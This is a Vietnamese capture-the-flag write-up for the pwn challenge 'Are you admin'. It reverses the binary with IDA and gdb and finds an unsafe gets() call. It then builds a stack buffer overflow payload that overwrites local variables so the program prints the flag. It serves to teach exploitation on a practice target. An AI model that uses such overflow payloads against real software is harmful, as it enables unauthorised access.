# Are you admin
**__reversing, buffer overflow__**   

```
nc 194.5.207.113 7020
```
File binary: [areyouadmin](https://github.com/BuiKimPhat/ctf-writeup/blob/master/pwn/tmuctf/areyouadmin/areyouadmin)

- Kiểm tra định dạng file `file areyouadmin`, ta thấy file thực thi có định dạng là ELF 64bit
- Đầu tiên, mình sẽ dùng IDA 64bit để phân tích file thực thi và thấy được hàm main có dạng như sau:
```
  tmulogo();
  v14 = 0;
  v13 = 0;
  v12 = 0;
  v11 = 0;
  v10 = 0;
  sub_10C0("Enter username:");
  sub_1110(&v8);
  sub_10C0("Enter password:");
  sub_1110(&v7);
  if ( sub_1100(&v8, "AlexTheUser")
    || sub_1100(&v7, "4l3x7h3p455w0rd")
    || v13 * v14 + v12 != 9535
    || v12 * v13 + v11 != 14242
    || v11 * v12 + v10 != 5843
    || v10 * v11 + v14 != 7113
    || v14 * v10 + v13 != 28735 )
  {
    result = 0;
  }
  else
  {
    LODWORD(v4) = sub_1120("flag.txt", "r");
    v9 = v4;
    if ( !v4 )
    {
      sub_10E0("Missing flag.txt. Contact an admin if you see this on remote.");
      sub_1130(1LL);
    }
    sub_10F0(&v6, 128LL, v9);
    sub_10E0("%s");
    result = 0;
  }
```
Có vẻ như quá trình tạo mã giả của hàm có vấn đề, nên các tên hàm hệ thống đều bị chuyển sang dạng "sub_????". Để biết được đó là hàm gì thì chỉ cần double click vào xem hàm đó trong chế độ xem mã assembly.      
Đổi lại tên các hàm "sub_????" cho dễ nhìn:
```
  tmulogo();
  v14 = 0;
  v13 = 0;
  v12 = 0;
  v11 = 0;
  v10 = 0;
  puts1("Enter username:");
  gets1(&v8);
  puts1("Enter password:");
  gets1(&v7);
  if ( strcmp1(&v8, "AlexTheUser")
    || strcmp1(&v7, "4l3x7h3p455w0rd")
    || v13 * v14 + v12 != 9535
    || v12 * v13 + v11 != 14242
    || v11 * v12 + v10 != 5843
    || v10 * v11 + v14 != 7113
    || v14 * v10 + v13 != 28735 )
  {
    result = 0;
  }
  else
  {
    LODWORD(v4) = fopen1("flag.txt", "r");
    v9 = v4;
    if ( !v4 )
    {
      printf1("Missing flag.txt. Contact an admin if you see this on remote.");
      exit1(1LL);
    }
    fgets1(&v6, 128LL, v9);
    printf1("%s");
    result = 0;
  }
```
Vì không cho đổi tên giống hàm chuẩn nên mình để thêm số 1 ở phía sau :vv

- Nhìn sơ qua chương trình, ta có thể thấy được chương trình có đoạn code chuyên dùng để in flag ở phía sau, nhưng để chạy được phần code đó thì ta phải thỏa các điều kiện:
    - Chuỗi **username == "AlexTheUser"**
    - Chuỗi **password == "4l3x7h3p455w0rd"**
    - v13 * v14 + v12 == 9535
    - v12 * v13 + v11 == 14242
    - v11 * v12 + v10 == 5843
    - v10 * v11 + v14 == 7113
    - v14 * v10 + v13 == 28735

- Quan sát thấy chương trình sử dụng hàm `gets` để nhận input, điều này sẽ dễ dẫn đến lỗi buffer overflow. Thử kiểm tra các chế độ bảo vệ của chương trình:
```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```
Chương trình không có chế độ bảo vệ buffer overflow (Canary), thế nên chúng ta có thể tự do điều khiển stack bằng input mà không cần lo nghĩ gì nhiều.

- 2 điều kiện username và password thì ta có thể dễ dàng nhập rồi. Vấn đề là chúng ta cần phải điều khiển 5 biến v14, v13, v12, v11, v10 trên stack để thỏa được điều kiện trên.    
Ta cần tìm xem giá trị của 5 biến này cần bằng bao nhiêu để thỏa điều kiện. Nhưng mấy thứ tính toán 5 ẩn thế này thì mình chịu nên mình bỏ hệ phương trình trên vào tool tính toán online [WolframAlpha](https://www.wolframalpha.com/) để tính hộ.   
Vì nếu để tên biến là v10, v11... thì tool sẽ hiểu nhầm thành v mũ 10, v mũ 11... nên mình đổi tên biến sang lần lượt từ v10 đến v14 là a, b, c, d, e
```
d * e + c = 9535, c * d + b = 14242, b * c + a = 5843, a * b + e = 7113, e * a + d = 28735
```
Vậy ta đã tìm được điều kiện cần: **v10 = 233, v11 = 30, v12 = 187, v13 = 76, v14 = 123**

Thứ cần tìm cuối cùng là phải viết payload như thế nào mới có thể ghi đè được các giá trị này vào các biến trên. 

- Để điều khiển được giá trị của các biến trên stack, ta cần tìm địa chỉ của nó. Dùng gdb-peda để debug và xem địa chỉ của các biến này cùng với 2 input username, password trên stack ở đâu:
```
gdb-peda$ start
```
```
gdb-peda$ pdis main
```
Đặt breakpoint ngay tại vị trí các biến được gán bằng 0 để tính địa chỉ các biến ở đâu
```
0x00005555555552f1 <+93>:    call   0x555555555229 <tmulogo>
0x00005555555552f6 <+98>:    mov    DWORD PTR [rbp-0x4],0x0
0x00005555555552fd <+105>:   mov    DWORD PTR [rbp-0x8],0x0
0x0000555555555304 <+112>:   mov    DWORD PTR [rbp-0xc],0x0
0x000055555555530b <+119>:   mov    DWORD PTR [rbp-0x10],0x0
0x0000555555555312 <+126>:   mov    DWORD PTR [rbp-0x14],0x0
```
```
gdb-peda$ b* 0x00005555555552f6
```
Đặt breakpoint tại vị trí gọi các hàm gets để xem địa chỉ của username và password trên stack:
```
0x0000555555555331 <+157>:   call   0x555555555110 <gets@plt>
0x0000555555555336 <+162>:   lea    rdi,[rip+0xed2]        # 0x55555555620f
0x000055555555533d <+169>:   call   0x5555555550c0 <puts@plt>
0x0000555555555342 <+174>:   lea    rax,[rbp-0xa0]
0x0000555555555349 <+181>:   mov    rdi,rax
0x000055555555534c <+184>:   mov    eax,0x0
0x0000555555555351 <+189>:   call   0x555555555110 <gets@plt>
```
```
gdb-peda$ b* 0x0000555555555331
gdb-peda$ b* 0x0000555555555351
```

- Chạy chương trình và tính các địa chỉ cần tìm:
    - Tại breakpoint 1: RBP = 0x7fffffffdca0, suy ra địa chỉ của v14 là 0x7fffffffdca0 - 0x4 = 0x7fffffffdc9c   
    Tương tự, các biến còn lại có cùng RBP nên địa chỉ của nó sẽ bé hơn địa chỉ của biến trước khai báo trước đó 0x4. Vậy ta có thể hình dung được thứ tự của các biến trên stack là như sau: v10, v11, v12, v13, v14 (mỗi biến chỉ có thể chứa được 4 bytes)
    - Tại breakpoint 2: 
    ```
    Guessed arguments:
    arg[0]: 0x7fffffffdc40 --> 0xd ('\r')
    ```
    Dữ liệu input sẽ được lưu vào tham số duy nhất trong gets nên địa chỉ của username trên stack sẽ là 0x7fffffffdc40
    - Tại breakpoint 3: tương tự, địa chỉ của password trên stack là 0x7fffffffdc00
    
- Sắp xếp lại các địa chỉ trên stack mà ta đã tính được:    
```
password - 64 bytes - username - 76 bytes - v10 - 4 bytes - v11 - 4 bytes - v12 - 4 bytes - v13 - 4 bytes - v14
```

- Viết payload:     
Chương trình cho phép ta nhập input 2 lần, lần đầu chứa ở username, lần sau chứa ở password. Ta có thể lợi dụng buffer overflow ở username để viết các kí tự offset cho tràn đến các địa chỉ của các biến đằng sau để ghi giá trị của các biến sau. 
    - payload1: `username + "\x00"*(76 - len(username)) + p32(v10) + p32(v11) + p32(v12) + p32(v13) + p32(v14)` (giá trị của các biến trong payload1 đã được nêu ở phần trên)
    Ta có thể thấy từ username chỉ cần nhập 76 kí tự thì sẽ nhập tiếp được giá trị của v10,...      
    Ở đây, mình dùng kí tự null `\x00` để làm kí tự offset tràn đến các địa chỉ sau vì hàm `strcmp` chỉ so sánh 2 chuỗi cho đến khi gặp kí tự null. Nếu muốn chèn kí tự khác thì chuỗi kí tự chèn phải bắt đầu bằng kí tự null để hàm có thể so sánh thành công chuỗi username chứ không đem các kí tự sau đi so sánh. 
    Mỗi biến v?? chỉ rộng 4 bytes nên mình dùng hàm `p32` của pwntool để chuyển giá trị của nó thành chuỗi 4 bytes kí tự.
    - payload2: `password`

- Và thế là xong! Chỉ cần cho chương trình chạy lần lượt với 2 payload như trên thì ta sẽ lấy được flag
